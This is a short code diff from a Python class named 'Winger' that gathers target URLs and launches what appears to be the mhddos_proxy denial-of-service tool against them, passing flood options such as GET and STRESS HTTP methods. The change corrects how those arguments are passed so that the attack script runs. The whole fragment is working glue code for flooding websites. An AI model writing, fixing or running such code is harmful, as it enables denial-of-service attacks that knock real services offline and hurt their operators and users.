@@ -15,10 +15,11 @@ class Winger:
                     urls.append('https://' + url)
                 urls.append(port.protocol + '://' + url)
 
-            subprocess.run(['./runner.py'] + urls + [
-                '-t 6000',
-                '-p 1200',
-                '--rpc 2000',
-                '--http-methods GET STRESS',
+            subprocess.call(['python3', './mhddos_proxy/runner.py'] + urls + [
+                '-p',
+                '1200',
+                '--http-methods',
+                'GET',
+                'STRESS',
                 '--debug'
             ])
